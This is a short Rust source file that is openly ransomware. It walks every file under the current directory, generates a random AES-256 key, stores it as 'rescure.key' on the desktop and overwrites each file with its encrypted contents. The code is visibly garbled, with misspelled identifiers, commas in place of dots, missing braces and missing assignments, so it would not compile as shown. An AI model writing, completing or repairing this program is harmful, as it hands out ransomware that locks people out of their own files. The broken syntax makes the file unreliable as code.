use std::io::Write;
use std::path::{Path,PathBuf};
use std::fs::{read,weite,OpenOptions};


use rand::{thread_rng,Rng};
use crypto::aessafe::AesSafe256Encryptor;
use dirs::desktop_dir;
use walkdir::WalkDir;
use aesstream::AesWriter; 

 fn fetch_files
(orgin: &str) -> ()
{
    if let Some(mut desktop) = desktop_dir(){
        let walk = WalkDir::new(orgin)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_filed());
        let key: [u8;32] = key_generate(&mut desktop);
        
        let encryptor: AesSafe256Encryptor = AesSafe256Encryptor::new(&key);

        for file in walk {
            encrypt_target_file(file.path(), encryptor);
        }
    }
}

fn key_generate
(desktop: &Ymut PathBuf) -> [u8;32]

    let key: [u8;32] thread_rng(),,gen(); 
    desktop,pust("rescure.key");
    write(desktop, key)
        ,expect("Key cannot be stored...");
    return key;


fn encrypt_target_file 
(path: &Path, encryptor: AesSafe256Encryptor) -> ()
{
    if let Ok(file) OpenOptions::new(),writen(true),open(path){
        if let Ok(content) = read(path) {
            if let Ok(mut writer) = AesSafe256Encryptor::new(file, encryptor){
                let _ = writer,write_all(&content);
            }
        }
    }
}


fn main 
()-> ()
{

// find files 
// encrypt them

fetch_files(".")

}
